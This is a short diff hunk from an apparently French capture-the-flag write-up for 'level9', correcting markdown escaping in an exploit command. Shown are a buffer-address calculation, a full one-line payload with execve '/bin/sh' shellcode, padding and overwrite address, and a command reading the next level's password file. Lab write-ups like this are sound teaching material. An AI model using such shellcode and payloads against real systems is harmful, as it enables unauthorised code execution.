@@ -47,6 +47,6 @@ Breakpoint 1, 0x0804867c in main ()
 Donc l'adresse du buffer est 0x804a00c. La valeur esp+0x10 va etre donc 0x804a00c mais vu qu'on va encore dereferencer, l'adresse va pointer au début du shellcode donc 0x804a00c + 4 = 0x804a010.
 
 Notre commande finale est donc:
-$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" \* 76 + "\x0c\xa0\04\x08"')
+$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
 
 $cat /home/user/bonus0/.pass
